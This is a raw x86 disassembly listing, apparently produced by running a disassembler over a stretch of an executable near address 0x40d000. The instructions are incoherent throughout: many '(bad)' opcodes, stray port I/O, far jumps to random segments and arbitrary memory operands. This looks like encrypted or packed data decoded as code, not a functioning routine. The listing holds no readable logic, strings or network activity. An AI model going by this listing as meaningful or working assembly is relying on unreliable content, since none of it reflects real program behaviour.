  40d03b:	adc    bh,BYTE PTR [ebx-0x37745147]
  40d041:	repnz fisttp DWORD PTR [ebp+0x3f]
  40d045:	fwait
  40d046:	cmp    al,BYTE PTR [ebp-0x1ee371b9]
  40d04c:	clc    
  40d04d:	dec    ebx
  40d04e:	out    0xf9,eax
  40d050:	lods   eax,DWORD PTR ds:[esi]
  40d051:	fistp  QWORD PTR ds:0xae3fbb46
  40d057:	xor    esp,DWORD PTR [esi]
  40d059:	push   ebp
  40d05a:	pushf  
  40d05b:	(bad)  
  40d05d:	dec    ebx
  40d05e:	mov    DWORD PTR [edx+0x47b1c45f],esi
  40d064:	adc    al,0xc5
  40d066:	inc    esp
  40d067:	mov    DWORD PTR [eax],esp
  40d069:	mov    ah,BYTE PTR [edx+0x3c]
  40d06c:	(bad)  
  40d06e:	dec    edi
  40d06f:	and    BYTE PTR ds:0xfd7c88df,bh
  40d075:	ins    DWORD PTR es:[edi],dx
  40d076:	int    0xf9
  40d078:	jns    0x40d063
  40d07a:	call   0xe075d521
  40d07f:	mov    dl,0x99
  40d081:	jle    0x40d0e0
  40d083:	push   es
  40d084:	nop
  40d085:	inc    edx
  40d086:	jnp    0x40d085
  40d088:	and    BYTE PTR ss:[edx+edi*8+0x11bb7681],bl
  40d090:	ss stc 
  40d092:	jnp    0x40d03a
  40d094:	or     al,0x43
  40d096:	mov    ecx,0x8e5af515
  40d09b:	outs   dx,DWORD PTR ds:[esi]
  40d09c:	pop    eax
  40d09d:	sbb    eax,DWORD PTR [eax+0x22]
  40d0a0:	or     ebx,esp
  40d0a2:	test   BYTE PTR [eax],bh
  40d0a4:	xchg   BYTE PTR [eax],ah
  40d0a6:	sbb    dl,dl
  40d0a8:	push   0x76644834
  40d0ad:	and    dl,BYTE PTR [eax-0x30c2d7d5]
  40d0b3:	mov    ds:0x1917efdf,eax
  40d0b8:	add    bh,cl
  40d0ba:	jl     0x40d0ab
  40d0bc:	idiv   DWORD PTR [esi-0x11]
  40d0bf:	into   
  40d0c0:	les    esi,FWORD PTR [ecx+0xb]
  40d0c3:	fisubr DWORD PTR [esi-0x4e]
  40d0c6:	add    dl,BYTE PTR [edi+0x6ad494a5]
  40d0cc:	or     eax,0x8652a54a
  40d0d1:	test   al,0x5c
  40d0d3:	or     ebx,0xffffffc8
  40d0d6:	(bad)  
  40d0d7:	xor    bh,BYTE PTR [ebx-0x7c]
  40d0da:	sbb    eax,DWORD PTR [ebx+edx*4]
  40d0dd:	test   DWORD PTR [esi-0x1a],eax
  40d0e0:	mov    bh,0x68
  40d0e2:	cmp    ebp,DWORD PTR [eax-0x6ebae73f]
  40d0e8:	std    
  40d0e9:	sub    ebp,DWORD PTR [edx]
  40d0eb:	dec    eax
  40d0ec:	mov    cl,0xd3
  40d0ee:	xor    eax,0xc6a5d68a
  40d0f3:	jecxz  0x40d0f8
  40d0f5:	std    
  40d0f6:	adc    DWORD PTR [esp+eax*2],edx
  40d0f9:	aad    0x29
  40d0fb:	scas   eax,DWORD PTR es:[edi]
  40d0fc:	je     0x40d132
  40d0fe:	jecxz  0x40d0f2
  40d100:	mov    ecx,0xc8ca880e
  40d105:	inc    edi
  40d106:	push   edi
  40d107:	iret   
  40d108:	mov    ds:0x26c98090,eax
  40d10d:	jmp    0x40d0e5
  40d10f:	add    esi,DWORD PTR [eax+0x4c07c67f]
  40d115:	dec    edx
  40d116:	int3   
  40d117:	es aas 
  40d119:	jl     0x40d13d
  40d11b:	adc    ecx,DWORD PTR [ebx-0x4]
  40d11e:	pushw  es
  40d120:	mov    eax,ds:0xcc9897dd
  40d125:	mov    ch,0xe9
  40d127:	div    BYTE PTR [edx+esi*8]
  40d12a:	into   
  40d12b:	push   ecx
  40d12c:	and    eax,0xc1084246
  40d131:	dec    esi
  40d132:	jnp    0x40d169
  40d134:	sti    
  40d135:	lods   al,BYTE PTR ds:[esi]
  40d136:	or     DWORD PTR [ecx-0x74],esi
  40d139:	addr16 pop esi
  40d13b:	test   al,0xf2
  40d13d:	(bad)  
  40d13e:	dec    cl
  40d140:	out    dx,eax
  40d141:	push   edx
  40d142:	test   eax,0x999999d4
  40d147:	mov    cl,0x73
  40d149:	xor    edx,DWORD PTR [edx+0x59c6b124]
  40d14f:	add    edx,ecx
  40d151:	frstor [ebp-0x6d]
  40d154:	rol    esi,1
  40d156:	hlt    
  40d157:	jge    0x40d110
  40d159:	(bad)  [ebp+0x7e]
  40d15c:	jle    0x40d0fc
  40d15e:	push   0xffffffb5
  40d160:	into   
  40d161:	das    
  40d162:	(bad)  
  40d163:	ficom  DWORD PTR [edi+0x59]
  40d166:	mov    esi,0xa93783e8
  40d16b:	sbb    BYTE PTR [eax+0x49e7e928],al
  40d171:	push   edx
  40d172:	jmp    0xe3d81522
  40d177:	cmp    BYTE PTR [ecx],ah
  40d179:	xchg   ebx,eax
  40d17a:	mov    eax,ds:0xf8b93637
  40d17f:	arpl   bx,di
  40d181:	pop    esi
  40d182:	shr    DWORD PTR ss:[esi+0x271bd4ce],cl
  40d189:	or     DWORD PTR [ecx],ecx
  40d18b:	xchg   edx,eax
  40d18c:	pop    eax
  40d18d:	dec    edx
  40d18e:	bound  ebx,QWORD PTR [ecx-0x6d8a018]
  40d194:	xchg   ch,ch
  40d196:	lahf   
  40d197:	jl     0x40d206
  40d199:	xchg   BYTE PTR [ebp+edx*8+0x5c],al
  40d19d:	mov    bl,dl
  40d19f:	mov    esi,0x9bf6734c
  40d1a4:	test   eax,0x23ab52bb
  40d1a9:	into   
  40d1aa:	xor    esi,ecx
  40d1ac:	mov    ch,0xd4
  40d1ae:	ja     0x40d142
  40d1b0:	fnstcw WORD PTR [ebp+0x3a]
  40d1b3:	shl    DWORD PTR [eax+0x3afacb34],cl
  40d1b9:	retf   0xa9cd
  40d1bc:	scas   al,BYTE PTR es:[edi]
  40d1bd:	sub    esp,DWORD PTR [edi+ecx*1+0x4f]
  40d1c1:	enter  0x6a0c,0x73
  40d1c5:	fwait
  40d1c6:	leave  
  40d1c7:	mov    eax,ds:0xbc1083b1
  40d1cc:	in     eax,0xe5
  40d1ce:	shl    bl,0x6d
  40d1d1:	aaa    
  40d1d2:	or     BYTE PTR [eax-0x7efbdada],ah
  40d1d8:	scas   eax,DWORD PTR es:[edi]
  40d1d9:	imul   eax,DWORD PTR [ebx],0x1a
  40d1dc:	add    dh,bh
  40d1de:	xor    al,0x2
  40d1e0:	push   eax
  40d1e1:	cmc    
  40d1e2:	repnz xchg edx,eax
  40d1e4:	inc    esp
  40d1e5:	sbb    DWORD PTR [edx],eax
  40d1e7:	push   ebx
  40d1e8:	adc    eax,0xddb52b20
  40d1ed:	mov    edi,0xccfa18dd
  40d1f2:	mov    edx,0x144133f9
  40d1f7:	stc    
  40d1f8:	jnp    0x40d20e
  40d1fa:	jo     0x40d1d1
  40d1fc:	xchg   ecx,eax
  40d1fd:	jmp    0x40d197
  40d1ff:	ins    DWORD PTR es:[edi],dx
  40d200:	std    
  40d201:	jle    0x40d242
  40d203:	xchg   ebp,eax
  40d204:	jo     0x40d200
  40d206:	mov    edx,0x890952e5
  40d20b:	loopne 0x40d209
  40d20d:	test   DWORD PTR [esi],ecx
  40d20f:	mov    BYTE PTR [edx],bh
  40d211:	pop    ecx
  40d212:	mov    ebp,0xc344b54f
  40d217:	(bad)  
  40d218:	sub    BYTE PTR [edx-0x666afce8],dl
  40d21e:	add    al,0x95
  40d220:	inc    edx
  40d221:	jp     0x40d218
  40d223:	fisttp WORD PTR [esi+0x30]
  40d226:	pop    edi
  40d227:	dec    edx
  40d228:	jnp    0x40d1be
  40d22a:	and    eax,0x32faf480
  40d22f:	jae    0x40d1bd
  40d231:	dec    ebx
  40d232:	jecxz  0x40d20d
  40d234:	pop    es
  40d235:	mov    DWORD PTR [ebp+0x32d07b],edx
  40d23b:	ins    DWORD PTR es:[edi],dx
  40d23c:	pop    es
  40d23d:	mov    al,0xd7
  40d23f:	cmp    dh,BYTE PTR ss:[ecx]
  40d242:	and    al,0x4c
  40d244:	repnz lds edi,FWORD PTR [edi]
  40d247:	pop    ebp
  40d248:	jecxz  0x40d211
  40d24a:	(bad)  
  40d24b:	aad    0xef
  40d24d:	repz (bad) 
  40d24f:	jmp    ecx
  40d251:	ja     0x40d223
  40d253:	in     eax,dx
  40d254:	jbe    0x40d2af
  40d256:	pop    ebx
  40d257:	pop    ebx
  40d258:	mov    ds:0x308f2e5c,eax
  40d25d:	dec    ecx
  40d25e:	push   edi
  40d25f:	sbb    eax,0x60c01170
  40d264:	xor    BYTE PTR [eax-0xf8cd1a4],ah
  40d26a:	loopne 0x40d2ad
  40d26c:	repz fldenv ds:[edi+0x78]
  40d271:	in     al,0xcb
  40d273:	xchg   edi,eax
  40d274:	mov    BYTE PTR [edx-0x74085afb],dl
  40d27a:	sbb    bl,BYTE PTR [ecx-0x23]
  40d27d:	pop    edx
  40d27e:	cmc    
  40d27f:	mov    edx,DWORD PTR [edx+ebp*1-0x6405dd31]
  40d286:	lds    edx,FWORD PTR [ecx-0x43903bb0]
  40d28c:	call   0xef57:0x39af8336
  40d293:	adc    BYTE PTR [edx+0x1b],al
  40d296:	gs popf 
  40d298:	retf   
  40d299:	fidivr DWORD PTR [esi+0x5c392936]
  40d29f:	fcomp  DWORD PTR [esi+0x17d08a2]
  40d2a5:	sti    
  40d2a6:	out    dx,al
  40d2a7:	(bad)  
  40d2a8:	push   ss
  40d2a9:	xchg   ebp,eax
  40d2aa:	in     al,0x5c
  40d2ac:	add    BYTE PTR [edx+0x23],0xa7
  40d2b0:	(bad)  
  40d2b1:	fldenv [esi-0x2]
  40d2b4:	das    
  40d2b5:	mov    esi,0x1d0ff98e
  40d2ba:	xlat   BYTE PTR ds:[ebx]
  40d2bb:	nop
  40d2bc:	jp     0x40d2bf
  40d2be:	loop   0x40d308
  40d2c0:	adc    al,BYTE PTR [edi+0x43133331]
  40d2c6:	add    bl,BYTE PTR [edi+0x31]
  40d2c9:	call   0xec95:0x2a53e122
  40d2d0:	xor    al,0xeb
  40d2d2:	add    bh,BYTE PTR [ebx-0x29]
  40d2d5:	out    0xc8,al
  40d2d7:	aaa    
  40d2d8:	mov    esi,0xa626edc5
  40d2dd:	add    ecx,DWORD PTR [ebx]
  40d2df:	cmp    al,0xcf
  40d2e1:	mov    bh,0x7a
  40d2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e4:	jmp    0x40d2a8
  40d2e6:	push   ecx
  40d2e7:	cmc    
  40d2e8:	add    dl,bl
  40d2ea:	(bad)  
  40d2eb:	push   esp
  40d2ec:	fnsave fs:[edi-0x5f]
  40d2f0:	out    0xf5,al
  40d2f2:	or     al,0x7e
  40d2f4:	out    0x1c,al
  40d2f6:	pop    ss
  40d2f7:	ds cdq 
  40d2f9:	ins    DWORD PTR es:[edi],dx
  40d2fa:	out    dx,al
  40d2fb:	cmc    
  40d2fc:	fsubr  st(6),st
  40d2fe:	sbb    dl,BYTE PTR [ebx]
  40d300:	(bad)  
  40d302:	mov    ss,WORD PTR [bp+di]
  40d305:	retf   0x67dd
  40d308:	mov    ah,BYTE PTR [edi+0x78]
  40d30b:	jno    0x40d299
  40d30d:	adc    al,0x6a
  40d30f:	pop    esi
  40d310:	inc    eax
  40d311:	lods   eax,DWORD PTR ds:[esi]
  40d312:	pop    esi
  40d313:	mov    ds:0xbeb01ddb,eax
  40d318:	mov    ?,WORD PTR [esi+0x7273174e]
  40d31e:	inc    ebp
  40d31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d320:	test   eax,0x8613c9fb
  40d325:	pusha  
  40d326:	shl    bh,cl
  40d328:	xchg   BYTE PTR [edx],ah
  40d32a:	mov    ds:0xa5e347cf,al
  40d32f:	mov    edi,0xc3b35479
  40d334:	aam    0x89
  40d336:	fadd   QWORD PTR [ebx+0x553d59c4]
  40d33c:	and    al,0x19
  40d33e:	sbb    eax,0x82790539
  40d343:	sub    BYTE PTR [ecx+0x733e77e6],bl
  40d349:	test   ecx,ebx
  40d34b:	fxch   st(7)
  40d34d:	repz aaa 
  40d34f:	inc    edi
  40d351:	ja     0x40d324
  40d353:	outs   dx,BYTE PTR ds:[esi]
  40d354:	mov    bh,0xe9
  40d356:	je     0x40d392
  40d358:	aam    0x6a
  40d35a:	mov    ch,0x11
  40d35c:	mov    ebp,0xc8193f3f
  40d361:	and    BYTE PTR [ebp-0x64411045],al
  40d367:	or     edx,DWORD PTR [edi+0x4ff5f8b6]
  40d36d:	cmp    eax,0x9a776c3
  40d372:	mov    ds:0x63a519a1,al
  40d377:	xor    BYTE PTR [ebx],0x2f
  40d37a:	xchg   esp,eax
  40d37b:	dec    eax
  40d37c:	pop    ebp
  40d37d:	sti    
  40d37e:	push   esp
  40d37f:	or     DWORD PTR [esi+0x28a720d8],eax
  40d385:	not    BYTE PTR es:[eax+0xe]
  40d389:	or     al,0xd5
  40d38b:	jnp    0x40d383
  40d38d:	sbb    DWORD PTR ds:0xc6e3a731,ecx
  40d393:	xor    DWORD PTR [edx+eiz*2-0x55e98220],esi
  40d39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39b:	jecxz  0x40d32a
  40d39d:	int3   
  40d39e:	mov    cl,0xe9
  40d3a0:	mov    esi,0x96dabaec
  40d3a5:	push   ebp
  40d3a6:	xor    esi,DWORD PTR [edx]
  40d3a8:	jp     0x40d369
  40d3aa:	jp     0x40d32d
  40d3ac:	int3   
  40d3ad:	push   cs
  40d3ae:	stos   DWORD PTR es:[edi],eax
  40d3af:	push   ebp
  40d3b0:	call   0x75865d22
  40d3b5:	retf   0xafff
  40d3b8:	xchg   edx,eax
  40d3b9:	xor    esp,0x93677239
  40d3bf:	push   0xffffffb5
  40d3c1:	dec    esp
  40d3c2:	scas   eax,DWORD PTR es:[edi]
  40d3c3:	scas   eax,DWORD PTR es:[edi]
  40d3c4:	adc    ch,BYTE PTR [ecx+0x7a01f3e4]
  40d3ca:	sahf   
  40d3cb:	inc    edi
  40d3cc:	stos   DWORD PTR es:[edi],eax
  40d3cd:	aad    0x1a
  40d3cf:	jno    0x40d3d2
  40d3d1:	jmp    0xdbab:0x70df91b6
  40d3d8:	dec    ebp
  40d3d9:	add    eax,0x4185a502
  40d3de:	add    al,0x2e
  40d3e0:	or     eax,0xc698292b
  40d3e5:	test   al,0x1b
  40d3e7:	into   
  40d3e8:	imul   ebx,DWORD PTR [edx-0x6f],0x7
  40d3ec:	mov    al,ds:0x64ef6a48
  40d3f1:	fdiv   DWORD PTR [ebx-0x77]
  40d3f4:	mov    eax,0x6f3b088
  40d3f9:	sub    al,0x17
  40d3fb:	and    DWORD PTR [eax+0x3601061e],edi
  40d401:	push   fs
  40d403:	jno    0x40d408
  40d405:	or     cl,bh
  40d407:	and    ecx,DWORD PTR [edx+0x3a8dea63]
  40d40d:	fucomp st(6)
  40d40f:	nop
  40d410:	outs   dx,BYTE PTR ds:[esi]
  40d411:	mov    edi,0xd3ff085a
  40d416:	addr16 push edx
  40d418:	nop
  40d419:	dec    edi
  40d41a:	lds    ebp,FWORD PTR [eax-0xeb0b785]
  40d420:	mov    edi,DWORD PTR [ebx+edi*8-0x76190332]
  40d427:	fist   DWORD PTR [ebp-0x21028616]
  40d42d:	cmp    eax,0xa99a86f7
  40d432:	in     al,dx
  40d433:	arpl   WORD PTR [ebx],di
  40d435:	add    ch,BYTE PTR [edi+esi*2+0x501de300]
  40d43c:	(bad)  
  40d43d:	or     al,0xe3
  40d43f:	pop    ecx
  40d440:	jle    0x40d42b
  40d442:	aas    
  40d443:	lahf   
  40d444:	in     eax,0xce
  40d446:	cmp    ebx,DWORD PTR [esi-0x4090621b]
  40d44c:	xchg   DWORD PTR [edi],esp
  40d44e:	lahf   
  40d44f:	jl     0x40d3e3
  40d451:	outs   dx,BYTE PTR ds:[esi]
  40d452:	mov    bh,0x4b
  40d454:	test   eax,0x2831da54
  40d459:	dec    eax
  40d45a:	dec    edx
  40d45b:	adc    eax,0x3f3f33f0
  40d460:	iret   
  40d461:	(bad)  
  40d462:	les    esp,FWORD PTR [edi+edi*8]
  40d465:	idiv   bh
  40d467:	(bad)  
  40d468:	pop    ebp
  40d469:	mov    ?,WORD PTR [ebp+0x57b2403c]
  40d46f:	pop    es
  40d470:	std    
  40d471:	mov    eax,0x3cd8815
  40d476:	sbb    BYTE PTR [eax],ah
  40d478:	xchg   edx,eax
  40d479:	call   0x495ef818
  40d47e:	in     al,dx
  40d47f:	pop    ecx
  40d480:	push   ebp
  40d481:	mov    DWORD PTR es:[ebx],edx
  40d484:	push   esp
  40d485:	outs   dx,DWORD PTR ds:[esi]
  40d486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d487:	jbe    0x40d4ac
  40d489:	push   ebx
  40d48a:	sub    DWORD PTR [ecx],edi
  40d48c:	sbb    eax,0x445b0213
  40d491:	push   ebp
  40d492:	test   al,0x80
  40d494:	pop    ds
  40d495:	imul   esi,esp,0xef8e8cf5
  40d49b:	push   ds
  40d49c:	outs   dx,DWORD PTR ds:[esi]
  40d49d:	rol    BYTE PTR [eax-0x66f6a3df],1
  40d4a3:	mov    al,ds:0xe0d6d722
  40d4a8:	jle    0x40d50a
  40d4aa:	loope  0x40d4c4
  40d4ac:	push   cs
  40d4ad:	xor    ebx,DWORD PTR [ebp+0x199aaeab]
  40d4b3:	mov    ds:0x155a2412,eax
  40d4b8:	push   ecx
  40d4b9:	adc    eax,DWORD PTR [edx+0x789204e2]
  40d4bf:	rcl    ah,0x44
  40d4c2:	pusha  
  40d4c3:	(bad)  
  40d4c4:	mov    eax,ds:0xc66d861b
  40d4c9:	stos   DWORD PTR es:[edi],eax
  40d4ca:	stos   DWORD PTR es:[edi],eax
  40d4cb:	ds out 0x9b,eax
  40d4ce:	adc    dl,ah
  40d4d0:	mov    dh,0x94
  40d4d2:	add    esi,DWORD PTR [ebx-0x25]
  40d4d5:	dec    ebp
  40d4d6:	mov    edx,0xcbf9dd01
  40d4db:	(bad)  
  40d4dc:	in     al,0x98
  40d4de:	in     al,dx
  40d4df:	jb     0x40d537
  40d4e1:	add    eax,0xf29a1bc8
  40d4e6:	sub    BYTE PTR [eax-0x49],ah
  40d4e9:	mov    esi,0x1d15b77c
  40d4ee:	jecxz  0x40d53e
  40d4f0:	lea    esi,[ebp+0x19]
  40d4f3:	sub    DWORD PTR [ecx+0x10e8400],0x4c8c7116
  40d4fd:	adc    ch,dl
  40d4ff:	mov    ch,0x1a
  40d501:	pop    ebx
  40d502:	popf   
  40d503:	nop
  40d504:	pop    esi
  40d505:	mov    edi,0xd7d4ea94
  40d50a:	push   0x69034066
  40d50f:	jp     0x40d50e
  40d511:	sbb    eax,0xbafd5b88
  40d516:	les    ebp,FWORD PTR ds:0x29b8732d
  40d51c:	ret    0x3ccf
  40d51f:	dec    eax
  40d520:	add    al,dl
  40d522:	push   ebp
  40d523:	pop    es
  40d524:	shl    BYTE PTR [ecx+edi*4],0xcc
  40d528:	push   ss
  40d529:	cld    
  40d52a:	adc    BYTE PTR [ebx+edi*2-0x403b038d],dh
  40d531:	jle    0x40d4b5
  40d533:	add    edi,ebx
  40d535:	div    DWORD PTR [eax-0x21]
  40d538:	jge    0x40d531
  40d53a:	icebp  
  40d53b:	in     al,0x93
  40d53d:	dec    edi
  40d53e:	adc    al,BYTE PTR [ebp-0x6f]
  40d541:	or     eax,0xa77fca88
  40d546:	loope  0x40d5b8
  40d548:	dec    eax
  40d549:	test   eax,0xa1d0e254
  40d54e:	cmp    edi,eax
  40d550:	mov    ebp,0xe7c53ccf
  40d555:	mov    esi,0xd9289178
  40d55a:	add    edi,DWORD PTR [esi+0x53]
  40d55d:	(bad)  [ecx+0x24]
  40d560:	fs dec ebx
  40d562:	mov    DWORD PTR [ebx+0x49df4807],ebx
  40d568:	push   0xffffffc6
  40d56a:	sbb    al,0x27
  40d56c:	sahf   
  40d56d:	(bad)  
  40d56e:	mov    ebx,0xc55488d
  40d573:	aam    0x58
  40d575:	clc    
  40d576:	test   eax,edx
  40d578:	sahf   
  40d579:	and    al,0xe9
  40d57b:	mov    gs,WORD PTR ds:0x9e44263d
  40d581:	lock push ebp
  40d583:	lods   eax,DWORD PTR ds:[esi]
  40d584:	push   es
  40d585:	popa   
  40d586:	sbb    DWORD PTR [edi-0x2f4afb35],ebp
  40d58c:	add    ch,cl
  40d58e:	adc    ah,dh
  40d590:	sti    
  40d591:	or     BYTE PTR [ecx-0x1744f67a],dl
  40d597:	outs   dx,BYTE PTR ds:[esi]
  40d598:	pop    es
  40d599:	cmc    
  40d59a:	xor    DWORD PTR [ebp+0x7],edx
  40d59d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d59e:	sti    
  40d59f:	dec    edx
  40d5a0:	push   esi
  40d5a1:	cli    
  40d5a2:	mov    ebx,0x39130af5
  40d5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5a8:	push   edx
  40d5a9:	icebp  
  40d5aa:	inc    esi
  40d5ab:	mov    esi,0x529659b9
  40d5b0:	inc    ebp
  40d5b1:	cdq    
  40d5b2:	push   ss
  40d5b3:	inc    ebp
  40d5b4:	add    dl,ch
  40d5b6:	cmc    
  40d5b7:	fucomi st,st(2)
  40d5b9:	add    al,BYTE PTR [ebx+ebx*4-0x11cbfb74]
  40d5c0:	cmp    eax,0xaccc40e1
  40d5c5:	xchg   esp,eax
  40d5c6:	push   ebp
  40d5c7:	popf   
  40d5c8:	out    dx,eax
  40d5c9:	sti    
  40d5ca:	pop    esi
  40d5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5cc:	xor    BYTE PTR [eax+0x648cb83b],cl
  40d5d2:	jbe    0x40d5a9
  40d5d4:	add    DWORD PTR [edi-0xb4d89ad],esi
  40d5da:	out    dx,eax
  40d5db:	mov    ah,0xe
  40d5dd:	mov    WORD PTR [eax-0x2a],?
  40d5e0:	and    dl,BYTE PTR [ebp+0x28db42c1]
  40d5e6:	rcl    BYTE PTR [ebp-0x187bec83],cl
  40d5ec:	imul   eax,esp,0x358c682c
  40d5f2:	cmp    BYTE PTR [ecx+0x2f41857c],bh
  40d5f8:	inc    eax
  40d5f9:	jmp    0x1804bca1
  40d5fe:	sub    esp,edx
  40d600:	xor    al,BYTE PTR [ecx+0x23a01518]
  40d606:	gs xchg esi,eax
  40d608:	cdq    
  40d609:	gs sub eax,0x7cbaa3ff
  40d60f:	jbe    0x40d591
  40d611:	pop    esp
  40d612:	mov    ds:0xd9b46ff3,eax
  40d617:	repnz fiadd WORD PTR ds:0x4cb0136
  40d61e:	and    al,0xe0
  40d620:	mov    bl,0xb2
  40d622:	ss ret 
  40d624:	daa    
  40d625:	jg     0x40d61b
  40d627:	repz cld 
  40d629:	aas    
  40d62a:	aas    
  40d62b:	mul    DWORD PTR [ecx+0x1e]
  40d62e:	jl     0x40d620
  40d630:	inc    ecx
  40d631:	sahf   
  40d632:	js     0x40d616
  40d634:	or     DWORD PTR [esi],eax
  40d636:	add    DWORD PTR [ecx],0xffffffb5
  40d639:	pop    edx
  40d63a:	or     eax,0x3094d548
  40d63f:	or     al,0x19
  40d641:	push   cs
  40d642:	xchg   esp,ebx
  40d644:	jae    0x40d615
  40d646:	cmp    eax,0xceb73d9c
  40d64b:	scas   eax,DWORD PTR es:[edi]
  40d64c:	inc    dh
  40d64e:	xchg   ebx,eax
  40d64f:	ins    BYTE PTR es:[edi],dx
  40d650:	mov    bh,0x1b
  40d652:	and    BYTE PTR [edx-0x40ecb2c0],bl
  40d658:	jle    0x40d60b
  40d65a:	mov    esp,0x886ad554
  40d65f:	and    dl,BYTE PTR [esi]
  40d661:	in     eax,0x16
  40d663:	push   esp
  40d664:	add    BYTE PTR ss:[ecx-0x1c],al
  40d668:	or     DWORD PTR [edx],eax
  40d66a:	popf   
  40d66b:	xor    ecx,edi
  40d66d:	popw   es
  40d66f:	adc    al,BYTE PTR [edx]
  40d671:	xor    dl,al
  40d673:	cmp    al,0x15
  40d675:	and    BYTE PTR [esi-0x2ce95aa0],al
  40d67b:	mov    dh,al
  40d67d:	lea    eax,[ebp+0x4ba3c4de]
  40d683:	jnp    0x40d701
  40d685:	inc    esi
  40d686:	pop    esi
  40d687:	cmp    ebp,ebx
  40d689:	(bad)  
  40d68a:	fistp  WORD PTR [edi-0x18]
  40d68d:	gs sub al,bl
  40d690:	outs   dx,BYTE PTR ds:[esi]
  40d691:	lahf   
  40d692:	inc    edi
  40d693:	fs pop edi
  40d695:	sub    eax,0xcf4d0231
  40d69a:	add    al,0xc
  40d69c:	mov    eax,ds:0xebb98b59
  40d6a1:	loopne 0x40d6db
  40d6a3:	and    DWORD PTR [ecx-0x4f],0x7
  40d6a7:	sar    BYTE PTR [edi+ebp*2+0x33],0x3f
  40d6ac:	and    edi,DWORD PTR [ebx+0x7f]
  40d6af:	inc    edx
  40d6b0:	outs   dx,BYTE PTR ds:[esi]
  40d6b1:	push   ebx
  40d6b2:	cmp    eax,0x4ddb740
  40d6b7:	add    eax,DWORD PTR [eax]
  40d6b9:	iret   
  40d6ba:	or     esi,esp
  40d6bc:	push   esp
  40d6bd:	pusha  
  40d6be:	ja     0x40d6ee
  40d6c0:	and    BYTE PTR [ecx+0xe],0xa9
  40d6c4:	push   ds
  40d6c5:	lods   al,BYTE PTR ds:[esi]
  40d6c6:	out    0x2,al
  40d6c8:	push   esp
  40d6c9:	in     eax,dx
  40d6ca:	jle    0x40d6a3
  40d6cc:	rcl    BYTE PTR [edi+edx*4-0xccf7902],0x2a
  40d6d4:	or     DWORD PTR [ebx-0x14],0xb7770279
  40d6db:	out    0x91,eax
  40d6dd:	ret    
  40d6de:	dec    esi
  40d6df:	(bad)  
  40d6e0:	or     ah,BYTE PTR [ecx]
  40d6e2:	adc    BYTE PTR [esi+0x1bf9f2a7],bl
  40d6e8:	enter  0x7fab,0x7d
  40d6ec:	fbld   TBYTE PTR [edi+0x72]
  40d6ef:	jb     0x40d67b
  40d6f1:	int    0xcd
  40d6f3:	out    0x29,eax
  40d6f5:	jns    0x40d73e
  40d6f7:	dec    ecx
  40d6f8:	les    edi,FWORD PTR [esi]
  40d6fa:	bound  esp,QWORD PTR [esi-0x69bea9c0]
  40d700:	rcl    BYTE PTR [edi-0x1938a5e6],0xa2
  40d707:	dec    eax
  40d708:	or     esi,DWORD PTR [ecx-0x6b]
  40d70b:	xor    eax,0xdc408b39
  40d710:	sti    
  40d711:	out    0xa5,al
  40d713:	jmp    FWORD PTR ds:0x25db5268
  40d719:	inc    esi
  40d71a:	cwde   
  40d71b:	or     BYTE PTR [eax-0x2b],0x1
  40d71f:	or     ecx,edi
  40d721:	sub    ebx,DWORD PTR [edi+edi*1]
  40d724:	push   ecx
  40d725:	out    0xef,eax
  40d727:	(bad)  
  40d728:	outs   dx,DWORD PTR ds:[esi]
  40d729:	mov    edi,0xf3fe4fc5
  40d72e:	psllw  mm6,mm0
  40d731:	ret    
  40d732:	psllq  mm3,mm4
  40d735:	jae    0x40d706
  40d737:	jno    0x40d72e
  40d739:	jmp    0x79e0:0x25cd2055
  40d740:	push   ds
  40d741:	ja     0x40d722
  40d743:	jge    0x40d77c
  40d745:	xor    esi,DWORD PTR [ebx]
  40d747:	repz cld 
  40d749:	int3   
  40d74a:	mov    edi,0x9c4e4dff
  40d74f:	mov    ss,WORD PTR [ecx-0x2a5665e]
  40d755:	push   ebp
  40d756:	pop    es
  40d757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d758:	das    
  40d759:	push   0x5be8fdd
  40d75e:	push   es
  40d75f:	ror    BYTE PTR [ebx+0x74],cl
  40d762:	sub    al,0x80
  40d764:	sub    bl,BYTE PTR [ebx-0x6eceb8e3]
  40d76a:	(bad)  
  40d76b:	hlt    
  40d76c:	sahf   
  40d76d:	adc    al,0x8e
  40d76f:	jle    0x40d7de
  40d771:	into   
  40d772:	aad    0x46
  40d774:	push   ebp
  40d775:	xchg   edi,eax
  40d776:	clc    
  40d777:	lods   al,BYTE PTR ds:[esi]
  40d778:	xchg   edx,eax
  40d779:	out    dx,al
  40d77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d77b:	mov    bh,0xb2
  40d77d:	inc    ecx
  40d77e:	aas    
  40d77f:	imul   edi,DWORD PTR [ecx+ecx*4+0x2b],0x822af294
  40d787:	add    al,BYTE PTR [edx]
  40d789:	mov    ?,esp
  40d78b:	mov    bh,0xaa
  40d78d:	cmp    bl,0x51
  40d790:	push   edx
  40d791:	fild   DWORD PTR [ebx+0x26]
  40d794:	pop    ds
  40d795:	mov    al,ds:0xa4fb2e7e
  40d79a:	(bad)  
  40d79b:	push   es
  40d79c:	and    BYTE PTR [ebp+0x35],ch
  40d79f:	mov    al,ds:0xbd98f189
  40d7a4:	repz or eax,0xf857b0a2
  40d7aa:	jns    0x40d738
  40d7ac:	shr    BYTE PTR [ebx-0x4b],0x5a
  40d7b0:	sbb    DWORD PTR [esp+ebp*4+0x156c045b],esp
  40d7b7:	sahf   
  40d7b8:	js     0x40d7c5
  40d7ba:	fisttp DWORD PTR [ebp+0x4c]
  40d7bd:	pop    es
  40d7be:	div    BYTE PTR [esp+ecx*2]
  40d7c1:	xor    ebx,DWORD PTR [eax+edi*1-0x55]
  40d7c5:	inc    edi
  40d7c6:	(bad)  
  40d7c7:	jmp    0xef77:0x9e485955
  40d7ce:	in     eax,0xd
  40d7d0:	jne    0x40d838
  40d7d2:	jg     0x40d7e5
  40d7d4:	and    dh,BYTE PTR [eax-0x51]
  40d7d7:	jae    0x40d806
  40d7d9:	clc    
  40d7da:	lahf   
  40d7db:	addr16 sbb cl,bh
  40d7de:	jae    0x40d81d
